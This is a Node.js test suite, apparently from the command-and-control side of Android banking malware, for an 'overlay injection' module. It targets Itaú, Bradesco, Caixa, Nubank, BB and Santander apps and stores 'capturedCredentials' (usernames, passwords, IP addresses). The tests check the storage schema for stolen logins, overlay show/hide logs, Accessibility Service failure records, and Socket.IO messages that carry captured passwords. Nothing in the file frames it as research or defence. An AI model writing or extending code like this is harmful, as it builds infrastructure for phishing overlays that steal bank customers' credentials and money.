const assert = require('assert');
const path = require('path');

const CONST = require(path.join(__dirname, '../includes/const.js'));

console.log('\n📦 Iniciando Overlay Injection Module Tests...\n');

let passCount = 0;
let failCount = 0;

// Teste 1: Verificar chave de mensagem
console.log('Test 1: Overlay Injection Message Key Registration');
try {
    assert.strictEqual(CONST.messageKeys.overlayInjection, '0xOI', 'Message key should be 0xOI');
    console.log('✅ Pass: Message key is correctly registered as 0xOI\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 2: Verificar schema de configuração
console.log('Test 2: Overlay Injection Config Schema Validation');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_client_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    assert(config, 'overlayInjectionConfig should exist');
    assert('enabledBanks' in config, 'enabledBanks should exist');
    assert(Array.isArray(config.enabledBanks), 'enabledBanks should be array');
    assert('activeOverlays' in config, 'activeOverlays should exist');
    assert('capturedCredentials' in config, 'capturedCredentials should exist');
    assert(Array.isArray(config.capturedCredentials), 'capturedCredentials should be array');
    assert('overlayLog' in config, 'overlayLog should exist');
    assert(Array.isArray(config.overlayLog), 'overlayLog should be array');
    assert('monitoringEnabled' in config, 'monitoringEnabled should exist');
    
    console.log('✅ Pass: Schema is correctly structured\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 3: Bancos habilitados
console.log('Test 3: Enabled Banks List');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_banks_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    const expectedBanks = ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'];
    
    for (let bank of expectedBanks) {
        assert(config.enabledBanks.includes(bank), `Bank ${bank} should be in enabledBanks`);
    }
    
    console.log('✅ Pass: All expected banks are enabled\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 4: Captura de credenciais
console.log('Test 4: Captured Credentials Structure');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_creds_' + Date.now());
    
    let capturedCred = {
        username: 'user123',
        password: 'pass456',
        appName: 'itau',
        packageName: 'com.itau',
        timestamp: new Date(),
        ipAddress: '192.168.1.100'
    };
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.capturedCredentials.push(capturedCred);
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.capturedCredentials.length > 0, 'Should have captured credentials');
    assert(saved.capturedCredentials[0].username === 'user123', 'Username should match');
    assert(saved.capturedCredentials[0].appName === 'itau', 'App name should be itau');
    
    console.log('✅ Pass: Credential capture structure is correct\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 5: Múltiplas credenciais capturadas
console.log('Test 5: Multiple Captured Credentials');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_multi_creds_' + Date.now());
    
    const credentials = [
        { username: 'user1', password: 'pass1', appName: 'itau' },
        { username: 'user2', password: 'pass2', appName: 'bradesco' },
        { username: 'user3', password: 'pass3', appName: 'caixa' }
    ];
    
    let config = testClient.get('overlayInjectionConfig').value();
    for (let cred of credentials) {
        config.capturedCredentials.push({
            username: cred.username,
            password: cred.password,
            appName: cred.appName,
            packageName: 'com.' + cred.appName,
            timestamp: new Date(),
            ipAddress: '192.168.1.100'
        });
    }
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.capturedCredentials.length === 3, 'Should have 3 credentials');
    assert(saved.capturedCredentials[0].appName === 'itau', 'First should be itau');
    assert(saved.capturedCredentials[2].appName === 'caixa', 'Third should be caixa');
    
    console.log('✅ Pass: Multiple credentials logged correctly\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 6: Overlay log entry
console.log('Test 6: Overlay Log Entry Structure');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_log_' + Date.now());
    
    let logEntry = {
        action: 'show_overlay',
        appName: 'itau',
        packageName: 'com.itau',
        timestamp: new Date(),
        success: true,
        details: 'Overlay displayed successfully'
    };
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.overlayLog.push(logEntry);
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.overlayLog.length > 0, 'Log should have entries');
    assert(saved.overlayLog[0].action === 'show_overlay', 'Action should match');
    assert(saved.overlayLog[0].success === true, 'Should be successful');
    
    console.log('✅ Pass: Overlay log structure is correct\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 7: Toggle monitoramento
console.log('Test 7: Monitoring Toggle');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_monitoring_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    
    config.monitoringEnabled = true;
    testClient.get('overlayInjectionConfig').assign(config).write();
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.monitoringEnabled === true, 'Monitoring should be enabled');
    
    config.monitoringEnabled = false;
    testClient.get('overlayInjectionConfig').assign(config).write();
    saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.monitoringEnabled === false, 'Monitoring should be disabled');
    
    console.log('✅ Pass: Monitoring toggle works\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 8: Enable/disable bancos
console.log('Test 8: Bank Enable/Disable');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_bank_toggle_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    
    config.enabledBanks = config.enabledBanks.filter(b => b !== 'itau');
    testClient.get('overlayInjectionConfig').assign(config).write();
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(!saved.enabledBanks.includes('itau'), 'Itau should be disabled');
    
    config.enabledBanks.push('itau');
    testClient.get('overlayInjectionConfig').assign(config).write();
    saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.enabledBanks.includes('itau'), 'Itau should be enabled');
    
    console.log('✅ Pass: Bank enable/disable works\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 9: Overlays ativos
console.log('Test 9: Active Overlays Tracking');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_active_' + Date.now());
    
    let activeOverlay = {
        appName: 'itau',
        packageName: 'com.itau',
        startTime: new Date(),
        endTime: null
    };
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.activeOverlays.push(activeOverlay);
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.activeOverlays.length > 0, 'Should have active overlays');
    assert(saved.activeOverlays[0].appName === 'itau', 'App name should match');
    assert(saved.activeOverlays[0].endTime === null, 'End time should be null while active');
    
    console.log('✅ Pass: Active overlay tracking works\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 10: Socket.IO Response Structure
console.log('Test 10: Socket.IO Response Structure');
try {
    const response = {
        action: 'capture_credentials',
        username: 'user123',
        password: 'pass456',
        appName: 'itau',
        success: true,
        details: 'Credenciais capturadas',
        timestamp: Date.now()
    };
    
    assert(response.action, 'Should have action');
    assert(response.username, 'Should have username');
    assert(response.password, 'Should have password');
    assert('success' in response, 'Should have success flag');
    assert(response.timestamp, 'Should have timestamp');
    
    console.log('✅ Pass: Response structure is valid\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 11: Ações válidas
console.log('Test 11: Valid Actions');
try {
    const validActions = [
        'show_overlay',
        'hide_overlay',
        'capture_credentials',
        'enable_monitoring',
        'disable_monitoring',
        'enable_bank',
        'disable_bank',
        'clear_credentials'
    ];
    
    for (let action of validActions) {
        assert(typeof action === 'string' && action.length > 0, `Action ${action} should be valid`);
    }
    
    console.log('✅ Pass: All actions are valid\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 12: Aplicativos bancários conhecidos
console.log('Test 12: Known Banking Applications');
try {
    const bankPackages = {
        'itau': 'com.itau',
        'bradesco': 'com.bradesco',
        'caixa': 'com.caixa',
        'nubank': 'com.nubank',
        'bb': 'com.bb',
        'santander': 'com.santander'
    };
    
    for (let bank in bankPackages) {
        assert(bankPackages[bank].includes('com.'), 'Package name should be valid');
    }
    
    console.log('✅ Pass: All banking packages are valid\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 13: Falhas de captura
console.log('Test 13: Failed Capture Logging');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_fail_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.overlayLog.push({
        action: 'show_overlay',
        appName: 'itau',
        packageName: 'com.itau',
        timestamp: new Date(),
        success: false,
        details: 'Accessibility Service not available'
    });
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.overlayLog[0].success === false, 'Should be marked as failed');
    assert(saved.overlayLog[0].details.includes('not available'), 'Should have error reason');
    
    console.log('✅ Pass: Failed captures logged correctly\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 14: Limpeza de credenciais
console.log('Test 14: Clear Credentials');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_clear_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.capturedCredentials.push({
        username: 'test',
        password: 'test',
        appName: 'itau',
        packageName: 'com.itau',
        timestamp: new Date(),
        ipAddress: '192.168.1.1'
    });
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.capturedCredentials.length > 0, 'Should have credentials initially');
    
    config.capturedCredentials = [];
    testClient.get('overlayInjectionConfig').assign(config).write();
    saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.capturedCredentials.length === 0, 'Credentials should be cleared');
    
    console.log('✅ Pass: Credential clearing works\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Teste 15: Limpeza de log
console.log('Test 15: Clear Overlay Log');
try {
    const databaseGateway = require(path.join(__dirname, '../includes/databaseGateway.js'));
    const testClient = new databaseGateway.clientdb('test_oi_clear_log_' + Date.now());
    
    let config = testClient.get('overlayInjectionConfig').value();
    config.overlayLog.push({
        action: 'show_overlay',
        appName: 'itau',
        packageName: 'com.itau',
        timestamp: new Date(),
        success: true,
        details: 'Test'
    });
    testClient.get('overlayInjectionConfig').assign(config).write();
    
    let saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.overlayLog.length > 0, 'Should have log entries initially');
    
    config.overlayLog = [];
    testClient.get('overlayInjectionConfig').assign(config).write();
    saved = testClient.get('overlayInjectionConfig').value();
    assert(saved.overlayLog.length === 0, 'Log should be cleared');
    
    console.log('✅ Pass: Log clearing works\n');
    passCount++;
} catch (error) {
    console.log('❌ Fail: ' + error.message + '\n');
    failCount++;
}

// Resumo
console.log('═'.repeat(50));
console.log(`\n📦 Overlay Injection Tests Complete`);
console.log(`✅ Passed: ${passCount}/15`);
console.log(`❌ Failed: ${failCount}/15\n`);

if (failCount > 0) process.exit(1);
